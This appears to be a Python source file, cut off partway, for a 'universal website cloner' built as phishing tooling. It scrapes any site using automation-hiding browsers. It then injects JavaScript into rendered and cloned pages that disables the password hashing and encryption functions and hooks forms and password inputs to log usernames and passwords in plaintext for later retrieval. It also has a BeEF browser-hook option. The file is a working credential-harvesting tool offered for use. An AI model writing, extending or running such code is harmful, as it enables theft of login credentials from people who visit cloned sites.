#!/usr/bin/env python3
"""
UNIVERSAL Website Cloner - FINAL VERSION WITH PASSWORD CAPTURE
Works with ANY website universally - not limited to specific sites
Enhanced with comprehensive resource discovery and modern web support
"""

import asyncio
import aiohttp
import aiofiles
import json
import re
import os
import time
import random
import hashlib
import mimetypes
import base64
import zlib
import gzip
import brotli
import logging
import threading
import queue
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
import requests
from functools import wraps
import tempfile
import shutil

# Enhanced imports with fallbacks
try:
    from bs4 import BeautifulSoup, Comment
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("⚠️ BeautifulSoup not available - using regex fallback")

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium not available - using requests only")

try:
    import undetected_chromedriver as uc
    UC_AVAILABLE = True
except ImportError:
    UC_AVAILABLE = False

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Suppress warnings
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('universal_cloner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class UniversalClonerConfig:
    """Universal configuration for any website"""
    def __init__(self):
        # Performance settings
        self.max_workers = 8
        self.max_concurrent_downloads = 16
        self.request_timeout = 30
        self.page_load_timeout = 60
        
        # Universal stealth settings
        self.rotate_user_agents = True
        self.mimic_human_behavior = True
        self.use_undetected_chrome = UC_AVAILABLE
        
        # Universal resource handling
        self.download_images = True
        self.download_fonts = True
        self.download_css = True
        self.download_js = True
        self.download_videos = True
        self.download_audio = True
        self.process_inline_resources = True
        self.rewrite_urls = True
        
        # Advanced universal features
        self.render_spa = True
        self.handle_auth_flows = True
        self.capture_api_calls = True
        self.discover_service_workers = True
        self.discover_web_manifests = True
        self.process_shadow_dom = True
        self.handle_lazy_loading = True
        
        # Password capture settings
        self.capture_passwords_plaintext = True
        self.disable_client_encryption = True
        self.log_password_attempts = True
        self.save_captured_passwords = True
        
        # Error handling
        self.max_retries = 3
        self.retry_delay = 1.0
        self.ignore_ssl_errors = True
        
        # Universal output
        self.output_base = 'cloned_sites'
        self.create_index_html = True

class UniversalUserAgentManager:
    """Universal user agent management for any website"""
    
    def __init__(self):
        self.agents = self._load_universal_agents()
        self.current_index = 0
    
    def _load_universal_agents(self):
        """Load universal user agent database for maximum compatibility"""
        return [
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'Windows',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'macOS',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'platform': 'Windows',
                'browser': 'Firefox',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            },
            {
                'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'Linux',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            },
            {
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
                'platform': 'iOS',
                'browser': 'Safari',
                'mobile': True,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            }
        ]
    
    def get_agent_for_user_agent(self, user_agent_string):
        """Get agent data for specific user agent string"""
        for agent in self.agents:
            if agent['ua'] == user_agent_string:
                return agent
        
        # Create dynamic entry for custom UA
        return {
            'ua': user_agent_string,
            'platform': 'Unknown',
            'browser': 'Unknown',
            'mobile': 'Mobile' in user_agent_string,
            'headers': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            }
        }

class UniversalResourceManager:
    """Universal resource manager for any website"""
    
    def __init__(self, config: UniversalClonerConfig):
        self.config = config
        self.session_pool = []
        self.stats = {
            'downloaded': 0,
            'failed': 0,
            'bytes_downloaded': 0,
            'processing_time': 0,
            'service_workers_found': 0,
            'manifests_found': 0,
            'shadow_dom_resources': 0
        }
        self.downloaded_urls = set()
        self.failed_urls = set()
        self.url_mappings = {}
        self.processed_css_imports = set()  # Track processed CSS imports
    
    async def initialize_sessions(self, user_agent_data):
        """Initialize universal HTTP sessions"""
        self.session_pool = []
        
        for i in range(5):  # Create more sessions for universal handling
            timeout = aiohttp.ClientTimeout(total=self.config.request_timeout)
            connector = aiohttp.TCPConnector(
                limit=100,  # Increased for universal usage
                limit_per_host=20,
                ssl=not self.config.ignore_ssl_errors,
                ttl_dns_cache=300
            )
            
            headers = dict(user_agent_data['headers'])
            headers['User-Agent'] = user_agent_data['ua']
            
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            
            self.session_pool.append(session)
    
    async def download_resource_universal(self, url: str, resource_type: str, 
                                        referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
        """Universal resource download for any website"""
        if url in self.downloaded_urls or url in self.failed_urls:
            return None
        
        def sync_download():
            """Universal synchronous download"""
            try:
                session = requests.Session()
                session.verify = False
                session.timeout = 30
                
                # Universal headers for any website
                headers = self._get_universal_headers(url, resource_type, referer)
                
                response = session.get(url, headers=headers, timeout=30, verify=False, 
                                     allow_redirects=True, stream=True)
                
                if response.status_code == 200:
                    # Handle large files with streaming
                    content = b''
                    for chunk in response.iter_content(chunk_size=8192):
                        content += chunk
                        # Limit file size to prevent abuse
                        if len(content) > 50 * 1024 * 1024:  # 50MB limit
                            logger.warning(f"File too large, truncating: {url}")
                            break
                    
                    # Universal decompression
                    content = self._universal_decompress(content, response.headers)
                    
                    return content, {
                        'url': url,
                        'content_type': response.headers.get('content-type', ''),
                        'size': len(content),
                        'status': response.status_code
                    }
                
                return None
                
            except Exception as e:
                logger.debug(f"Download failed for {url}: {e}")
                return None
        
        # Run in thread
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            try:
                result = await loop.run_in_executor(None, sync_download)
                
                if result:
                    content, metadata = result
                    self.downloaded_urls.add(url)
                    self.stats['downloaded'] += 1
                    self.stats['bytes_downloaded'] += len(content)
                    return content, metadata
                else:
                    self.failed_urls.add(url)
                    self.stats['failed'] += 1
                    return None
                    
            except Exception as e:
                logger.error(f"Thread execution failed: {e}")
                self.failed_urls.add(url)
                self.stats['failed'] += 1
                return None
    
    def _get_universal_headers(self, url: str, resource_type: str, referer: str = None) -> dict:
        """Get universal headers that work with any website"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1'
        }
        
        # Universal accept headers for all resource types
        accept_headers = {
            'image': 'image/avif,image/webp,image/apng,image/svg+xml,image/png,image/jpeg,image/*,*/*;q=0.8',
            'svg': 'image/svg+xml,image/*,*/*;q=0.8',
            'css': 'text/css,*/*;q=0.1',
            'js': 'application/javascript,text/javascript,*/*;q=0.01',
            'font': 'font/woff2,font/woff,font/ttf,font/otf,application/font-woff2,application/font-woff,*/*;q=0.1',
            'video': 'video/webm,video/ogg,video/mp4,video/*,*/*;q=0.8',
            'audio': 'audio/webm,audio/ogg,audio/wav,audio/mp3,audio/*,*/*;q=0.8',
            'document': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        headers['Accept'] = accept_headers.get(resource_type, '*/*')
        
        if referer:
            headers['Referer'] = referer
        
        # Add modern browser headers for better compatibility
        headers.update({
            'Sec-Fetch-Dest': self._get_fetch_dest(resource_type),
            'Sec-Fetch-Mode': 'no-cors',
            'Sec-Fetch-Site': 'same-origin',
            'Upgrade-Insecure-Requests': '1'
        })
        
        return headers
    
    def _get_fetch_dest(self, resource_type: str) -> str:
        """Get appropriate Sec-Fetch-Dest for resource type"""
        dest_map = {
            'image': 'image',
            'svg': 'image', 
            'css': 'style',
            'js': 'script',
            'font': 'font',
            'video': 'video',
            'audio': 'audio',
            'document': 'document'
        }
        return dest_map.get(resource_type, 'empty')
    
    def _universal_decompress(self, content: bytes, headers: dict) -> bytes:
        """Universal decompression for any encoding"""
        if not content:
            return content
        
        encoding = headers.get('content-encoding', '').lower()
        
        try:
            if 'br' in encoding:
                return brotli.decompress(content)
            elif 'gzip' in encoding:
                return gzip.decompress(content)
            elif 'deflate' in encoding:
                return zlib.decompress(content)
        except Exception:
            # Try magic byte detection
            if content[:2] == b'\x1f\x8b':
                try:
                    return gzip.decompress(content)
                except:
                    pass
            elif content[:1] == b'\x78':
                try:
                    return zlib.decompress(content)
                except:
                    pass
        
        return content
    
    async def cleanup(self):
        """Cleanup all sessions"""
        for session in self.session_pool:
            await session.close()

class UniversalBrowserManager:
    """Universal browser manager with password capture for any website"""
    
    def __init__(self, config: UniversalClonerConfig):
        self.config = config
        self.driver = None
        self.captured_passwords = []
        self.password_capture_enabled = config.capture_passwords_plaintext
    
    def initialize_browser(self, user_agent: str):
        """Initialize universal browser"""
        try:
            if self.config.use_undetected_chrome and UC_AVAILABLE:
                return self._create_undetected_chrome(user_agent)
            elif SELENIUM_AVAILABLE:
                return self._create_selenium_browser(user_agent)
        except Exception as e:
            logger.warning(f"Browser initialization failed: {e}")
        
        return None
    
    def _create_undetected_chrome(self, user_agent: str):
        """Create undetected Chrome for universal stealth"""
        try:
            options = uc.ChromeOptions()
            
            # Universal stealth arguments for any website
            stealth_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--window-size=1920,1080',
                f'--user-agent={user_agent}',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=VizDisplayCompositor',
                '--disable-extensions',
                '--no-first-run',
                '--disable-default-apps',
                '--disable-sync',
                '--disable-background-timer-throttling',
                '--disable-renderer-backgrounding',
                '--disable-backgrounding-occluded-windows'
            ]
            
            for arg in stealth_args:
                options.add_argument(arg)
            
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            
            driver = uc.Chrome(options=options)
            
            # Universal stealth techniques
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
            driver.execute_cdp_cmd('Runtime.enable', {})
            
            return driver
            
        except Exception as e:
            logger.error(f"Undetected Chrome creation failed: {e}")
            return None
    
    def _create_selenium_browser(self, user_agent: str):
        """Create regular Selenium browser with universal compatibility"""
        try:
            # Try Chrome first
            options = ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument(f'--user-agent={user_agent}')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            
            driver = webdriver.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return driver
            
        except Exception:
            # Fallback to Firefox
            try:
                options = FirefoxOptions()
                options.add_argument('--headless')
                options.set_preference('general.useragent.override', user_agent)
                options.set_preference('dom.webdriver.enabled', False)
                
                return webdriver.Firefox(options=options)
                
            except Exception as e:
                logger.error(f"Firefox creation failed: {e}")
                return None
    
    async def render_page_universal(self, url: str) -> Optional[str]:
        """Universal page rendering with comprehensive resource discovery"""
        if not self.driver:
            return None
        
        try:
            self.driver.set_page_load_timeout(self.config.page_load_timeout)
            
            # Inject password capture before navigation
            if self.password_capture_enabled:
                self._inject_universal_password_capture()
            
            self.driver.get(url)
            
            # Wait for initial load
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Re-inject password capture after page load
            if self.password_capture_enabled:
                self._inject_universal_password_capture()
            
            # Universal human behavior simulation
            if self.config.mimic_human_behavior:
                await self._simulate_universal_human_behavior()
            
            # Universal lazy loading trigger
            await self._trigger_universal_lazy_loading()
            
            # Wait for dynamic content
            await asyncio.sleep(3)
            
            # Final password capture injection
            if self.password_capture_enabled:
                self._inject_universal_password_capture()
            
            return self.driver.page_source
            
        except Exception as e:
            logger.error(f"Universal page rendering failed: {e}")
            return None
    
    async def _simulate_universal_human_behavior(self):
        """Universal human behavior simulation for any website"""
        try:
            # Universal scrolling patterns
            scroll_positions = [0.1, 0.3, 0.5, 0.7, 0.9, 1.0, 0.5, 0.0]
            for position in scroll_positions:
                self.driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {position});")
                await asyncio.sleep(random.uniform(0.5, 1.5))
            
            # Universal mouse movements and clicks
            try:
                # Move mouse to random elements
                elements = self.driver.find_elements(By.TAG_NAME, "div")[:5]
                for element in elements:
                    try:
                        ActionChains(self.driver).move_to_element(element).perform()
                        await asyncio.sleep(random.uniform(0.1, 0.3))
                    except:
                        pass
            except:
                pass
                
        except Exception:
            pass
    
    async def _trigger_universal_lazy_loading(self):
        """Universal lazy loading trigger for any website"""
        try:
            # Comprehensive lazy loading script for all patterns
            lazy_loading_script = """
                // Universal lazy loading trigger
                
                // 1. Trigger intersection observers
                const lazyElements = document.querySelectorAll('[data-src], [data-lazy-src], [loading="lazy"], [data-original]');
                lazyElements.forEach(el => {
                    el.scrollIntoView({behavior: 'smooth', block: 'center'});
                    
                    // Force load data-src patterns
                    if (el.dataset.src && !el.src) {
                        el.src = el.dataset.src;
                    }
                    if (el.dataset.lazySrc && !el.src) {
                        el.src = el.dataset.lazySrc;
                    }
                    if (el.dataset.original && !el.src) {
                        el.src = el.dataset.original;
                    }
                });
                
                // 2. Trigger manual intersection observer events
                if (window.IntersectionObserver) {
                    const observers = [];
                    document.querySelectorAll('*').forEach(el => {
                        if (el._observers) {
                            observers.push(...el._observers);
                        }
                    });
                    
                    // Manually trigger observers
                    observers.forEach(observer => {
                        try {
                            observer.callback([{isIntersecting: true, target: observer.target}]);
                        } catch (e) {}
                    });
                }
                
                // 3. Force load common lazy loading libraries
                if (typeof LazyLoad !== 'undefined' && LazyLoad.prototype.loadAll) {
                    try { LazyLoad.prototype.loadAll(); } catch(e) {}
                }
                
                // 4. Trigger scroll events
                window.dispatchEvent(new Event('scroll'));
                window.dispatchEvent(new Event('resize'));
                window.dispatchEvent(new Event('load'));
                
                // 5. Force load images with common patterns
                document.querySelectorAll('img').forEach(img => {
                    if (!img.src || img.src.includes('placeholder') || img.src.includes('lazy')) {
                        ['data-src', 'data-lazy-src', 'data-original', 'data-url'].forEach(attr => {
                            if (img.getAttribute(attr)) {
                                img.src = img.getAttribute(attr);
                            }
                        });
                    }
                });
                
                // 6. Trigger module loading
                if (typeof __webpack_require__ !== 'undefined') {
                    try {
                        // Trigger webpack chunk loading
                        if (__webpack_require__.e) {
                            __webpack_require__.e = __webpack_require__.e || function() { return Promise.resolve(); };
                        }
                    } catch (e) {}
                }
                
                return lazyElements.length;
            """
            
            triggered_count = self.driver.execute_script(lazy_loading_script)
            logger.debug(f"Triggered lazy loading for {triggered_count} elements")
            
            # Additional scrolling to trigger more lazy loading
            for i in range(5):
                self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                await asyncio.sleep(0.5)
                self.driver.execute_script("window.scrollTo(0, 0);")
                await asyncio.sleep(0.5)
                
        except Exception as e:
            logger.debug(f"Lazy loading trigger failed: {e}")
    
    def _inject_universal_password_capture(self):
        """Universal password capture system for any website"""
        if not self.password_capture_enabled:
            return
            
        universal_capture_script = '''
        (function() {
            if (window.universalPasswordCaptureActive) return;
            window.universalPasswordCaptureActive = true;
            
            console.log("🔑 UNIVERSAL PASSWORD CAPTURE ACTIVATED");
            
            // Universal password storage
            window.universalCapturedData = window.universalCapturedData || {
                passwords: [], usernames: [], formData: {}, blocked_encryptions: []
            };
            
            // Universal encryption blocking - works for any site
            const universalEncryptionKill = (funcName) => {
                try {
                    Object.defineProperty(window, funcName, {
                        get: () => (p) => { 
                            console.log(`🔑 UNIVERSAL KILL ${funcName}:`, p);
                            window.universalCapturedData.passwords.push({
                                field: funcName, password: p, timestamp: Date.now(), source: 'universal-kill'
                            });
                            return p;
                        },
                        set: () => console.log(`🛡️ UNIVERSAL BLOCK ${funcName} SET`),
                        configurable: false
                    });
                } catch (e) {}
            };
            
            // Kill all possible encryption functions
            const encryptionFunctions = [
                'encrypt', 'hash', 'md5', 'sha1', 'sha256', 'btoa', 'encode',
                'PWDEncrypt', 'encryptPassword', 'hashPassword', 'cryptPassword',
                'passwordHash', 'hashPwd', 'encryptPwd', 'scramble', 'obfuscate'
            ];
            encryptionFunctions.forEach(universalEncryptionKill);
            
            // Universal form monitoring
            const universalFormMonitor = () => {
                document.querySelectorAll('form').forEach(form => {
                    if (!form._universalMonitored) {
                        form._universalMonitored = true;
                        
                        form.addEventListener('submit', function(e) {
                            const formData = new FormData(this);
                            const captured = {};
                            
                            for (let [key, value] of formData.entries()) {
                                captured[key] = value;
                                
                                if (/pass|pwd|password|secret|pin/i.test(key) || 
                                    (typeof value === 'string' && value.length >= 4 && value.length <= 128)) {
                                    console.log(`🔑 UNIVERSAL FORM PASSWORD - ${key}:`, value);
                                    window.universalCapturedData.passwords.push({
                                        field: key, password: value, timestamp: Date.now(), source: 'universal-form'
                                    });
                                }
                                
                                if (/email|user|login|account/i.test(key)) {
                                    console.log(`👤 UNIVERSAL USERNAME - ${key}:`, value);
                                    window.universalCapturedData.usernames.push({
                                        field: key, username: value, timestamp: Date.now(), source: 'universal-form'
                                    });
                                }
                            }
                            
                            window.universalCapturedData.formData = captured;
                        });
                    }
                });
            };
            
            // Universal input monitoring
            const universalInputMonitor = () => {
                document.querySelectorAll('input').forEach(input => {
                    const type = (input.type || '').toLowerCase();
                    const name = (input.name || input.id || '').toLowerCase();
                    
                    if (type === 'password' || /pass|pwd|secret|pin/i.test(name)) {
                        if (!input._universalMonitored) {
                            input._universalMonitored = true;
                            
                            ['input', 'change', 'blur', 'keyup', 'paste'].forEach(eventType => {
                                input.addEventListener(eventType, function() {
                                    if (this.value) {
                                        console.log(`🔑 UNIVERSAL ${eventType.toUpperCase()} - ${name}:`, this.value);
                                        window.universalCapturedData.passwords.push({
                                            field: name, password: this.value, timestamp: Date.now(), 
                                            source: `universal-${eventType}`
                                        });
                                    }
                                });
                            });
                        }
                    }
                });
            };
            
            // Initialize universal monitoring
            universalFormMonitor();
            universalInputMonitor();
            
            // Continuous monitoring for dynamic content
            setInterval(() => {
                universalFormMonitor();
                universalInputMonitor();
            }, 1000);
            
            // Universal access function
            window.getUniversalCapturedData = () => window.universalCapturedData;
            
            console.log("✅ UNIVERSAL PASSWORD CAPTURE READY");
            
        })();
        '''
        
        try:
            self.driver.execute_script(universal_capture_script)
            logger.debug("Universal password capture injected")
        except Exception as e:
            logger.debug(f"Password capture injection failed: {e}")
    
    def get_captured_passwords(self) -> Optional[Dict]:
        """Get captured passwords from universal system"""
        try:
            captured_data = self.driver.execute_script("return window.getUniversalCapturedData ? window.getUniversalCapturedData() : null;")
            if captured_data and captured_data.get('passwords'):
                logger.info(f"🔑 Retrieved {len(captured_data['passwords'])} universal passwords")
                self.captured_passwords.append(captured_data)
                return captured_data
            return None
        except Exception as e:
            logger.debug(f"Password retrieval failed: {e}")
            return None
    
    def cleanup(self):
        """Cleanup universal browser"""
        if self.driver:
            try:
                final_capture = self.get_captured_passwords()
                if final_capture:
                    logger.info(f"🔑 Final universal password capture: {len(final_capture.get('passwords', []))} passwords")
                self.driver.quit()
            except Exception:
                pass
            self.driver = None

class UniversalContentProcessor:
    """Universal content processor for any website"""
    
    def __init__(self, config: UniversalClonerConfig, resource_manager: UniversalResourceManager):
        self.config = config
        self.resource_manager = resource_manager
    
    async def process_html_universal(self, html_content: str, base_url: str, 
                                   output_dir: Path, beef_enabled: bool = False) -> str:
        """Universal HTML processing for any website"""
        
        if not BS4_AVAILABLE:
            return self._process_with_regex_universal(html_content, base_url, output_dir, beef_enabled)
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Universal password capture injection (first priority)
        if self.config.capture_passwords_plaintext:
            self._inject_universal_password_capture_html(soup)
        
        # Universal encryption blocking
        self._disable_universal_encryption_scripts(soup)
        
        # Remove universal tracking
        self._remove_universal_tracking_scripts(soup)
        
        # Universal resource processing with comprehensive discovery
        await self._process_universal_resources(soup, base_url, output_dir)
        
        # Universal URL rewriting
        self._rewrite_universal_urls(soup, base_url)
        
        # Universal form processing
        self._process_universal_forms(soup)
        
        # BeEF integration if enabled
        if beef_enabled:
            self._add_beef_hook(soup)
        
        # Universal AJAX blocking
        self._add_universal_ajax_blocking(soup)
        
        # Universal JavaScript additions
        self._add_universal_js_enhancements(soup)
        
        return str(soup)
    
    async def _process_universal_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
        """Universal comprehensive resource discovery and processing"""
        
        # Discover all resources using universal methods
        all_resources = []
        
        # Standard resources
        all_resources.extend(self._discover_standard_resources(soup, base_url))
        
        # Advanced resources
        all_resources.extend(self._discover_advanced_resources(soup, base_url))
        
        # Service worker resources
        if self.config.discover_service_workers:
            all_resources.extend(await self._discover_service_worker_resources(soup, base_url, output_dir))
        
        # Web manifest resources
        if self.config.discover_web_manifests:
            all_resources.extend(await self._discover_web_manifest_resources(soup, base_url, output_dir))
        
        # Dynamic resources from any source
        all_resources.extend(self._discover_dynamic_universal_resources(soup, base_url))
        
        # Remove duplicates
        unique_resources = self._deduplicate_resources(all_resources)
        
        logger.info(f"🔍 Universal resource discovery: {len(unique_resources)} total resources")
        
        if not unique_resources:
            return
        
        # Process all resources with universal semaphore
        semaphore = asyncio.Semaphore(self.config.max_concurrent_downloads)
        tasks = []
        
        for resource_url, element, attr, resource_type in unique_resources:
            task = self._process_universal_resource(
                semaphore, resource_url, element, attr, resource_type, base_url, output_dir
            )
            tasks.append(task)
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in results if r and not isinstance(r, Exception))
            logger.info(f"✅ Universal processing complete: {success_count}/{len(tasks)} resources processed")
    
    def _discover_standard_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover all standard web resources universally"""
        resources = []
        
        # CSS resources (all patterns)
        css_selectors = [
            ('link[rel="stylesheet"]', 'href', 'css'),
            ('link[type="text/css"]', 'href', 'css'),
            ('style[src]', 'src', 'css'),
            ('link[rel="preload"][as="style"]', 'href', 'css'),
            ('link[rel="alternate stylesheet"]', 'href', 'css')
        ]
        
        for selector, attr, res_type in css_selectors:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and self._is_valid_resource_url(url, base_url):
                    resources.append((url, element, attr, res_type))
        
        # JavaScript resources (all patterns)
        js_selectors = [
            ('script[src]', 'src', 'js'),
            ('script[type*="javascript"][src]', 'src', 'js'),
            ('link[rel="preload"][as="script"]', 'href', 'js'),
            ('link[rel="modulepreload"]', 'href', 'js')
        ]
        
        for selector, attr, res_type in js_selectors:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and self._is_valid_resource_url(url, base_url):
                    resources.append((url, element, attr, res_type))
        
        # Image resources (comprehensive)
        image_selectors = [
            ('img[src]', 'src', 'image'),
            ('img[data-src]', 'data-src', 'image'),
            ('img[data-lazy-src]', 'data-lazy-src', 'image'),
            ('img[data-original]', 'data-original', 'image'),
            ('source[src]', 'src', 'image'),
            ('source[srcset]', 'srcset', 'image'),
            ('picture source[srcset]', 'srcset', 'image'),
            ('link[rel*="icon"]', 'href', 'image'),
            ('meta[property="og:image"]', 'content', 'image'),
            ('meta[name="twitter:image"]', 'content', 'image'),
            ('meta[name="msapplication-TileImage"]', 'content', 'image')
        ]
        
        for selector, attr, res_type in image_selectors:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and self._is_valid_resource_url(url, base_url):
                    if attr == 'srcset':
                        # Handle srcset with multiple URLs
                        srcset_urls = self._parse_srcset(url)
                        for srcset_url in srcset_urls:
                            if self._is_valid_resource_url(srcset_url, base_url):
                                resources.append((srcset_url, element, attr, res_type))
                    else:
                        resources.append((url, element, attr, res_type))
        
        # Font resources (comprehensive)
        font_selectors = [
            ('link[href*=".woff"]', 'href', 'font'),
            ('link[href*=".woff2"]', 'href', 'font'),
            ('link[href*=".ttf"]', 'href', 'font'),
            ('link[href*=".otf"]', 'href', 'font'),
            ('link[href*=".eot"]', 'href', 'font'),
            ('link[rel="preload"][as="font"]', 'href', 'font'),
            ('@font-face', None, 'font')  # Special case handled separately
        ]
        
        for selector, attr, res_type in font_selectors:
            if selector == '@font-face':
                # Handle @font-face in style tags
                resources.extend(self._extract_font_face_urls(soup, base_url))
            else:
                for element in soup.select(selector):
                    url = element.get(attr)
                    if url and self._is_valid_resource_url(url, base_url):
                        resources.append((url, element, attr, res_type))
        
        # Video and audio resources
        media_selectors = [
            ('video[src]', 'src', 'video'),
            ('video source[src]', 'src', 'video'),
            ('video[poster]', 'poster', 'image'),
            ('audio[src]', 'src', 'audio'),
            ('audio source[src]', 'src', 'audio'),
            ('track[src]', 'src', 'text')
        ]
        
        for selector, attr, res_type in media_selectors:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and self._is_valid_resource_url(url, base_url):
                    resources.append((url, element, attr, res_type))
        
        return resources
    
    def _discover_advanced_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover advanced and modern web resources"""
        resources = []
        
        # CSS background and inline resources
        resources.extend(self._discover_css_inline_resources(soup, base_url))
        
        # JavaScript embedded resources
        resources.extend(self._discover_js_embedded_resources(soup, base_url))
        
        # Data attribute resources (lazy loading patterns)
        data_attributes = [
            'data-src', 'data-href', 'data-url', 'data-image', 'data-bg', 
            'data-background', 'data-lazy-src', 'data-original', 'data-thumb',
            'data-full', 'data-large', 'data-high-res'
        ]
        
        for attr in data_attributes:
            for element in soup.find_all(attrs={attr: True}):
                url = element.get(attr)
                if url and self._is_valid_resource_url(url, base_url):
                    resource_type = self._detect_universal_resource_type(url)
                    resources.append((url, element, attr, resource_type))
        
        # SVG specific resources
        resources.extend(self._discover_svg_resources(soup, base_url))
        
        # Preload and prefetch resources
        preload_selectors = [
            ('link[rel="preload"]', 'href'),
            ('link[rel="prefetch"]', 'href'),
            ('link[rel="dns-prefetch"]', 'href'),
            ('link[rel="preconnect"]', 'href'),
            ('link[rel="modulepreload"]', 'href')
        ]
        
        for selector, attr in preload_selectors:
            for element in soup.select(selector):
                url = element.get(attr)
                if url and self._is_valid_resource_url(url, base_url):
                    as_value = element.get('as', '')
                    resource_type = self._map_as_to_resource_type(as_value) or self._detect_universal_resource_type(url)
                    resources.append((url, element, attr, resource_type))
        
        return resources
    
    async def _discover_service_worker_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path) -> List[Tuple[str, Any, str, str]]:
        """Discover and process service worker resources"""
        resources = []
        
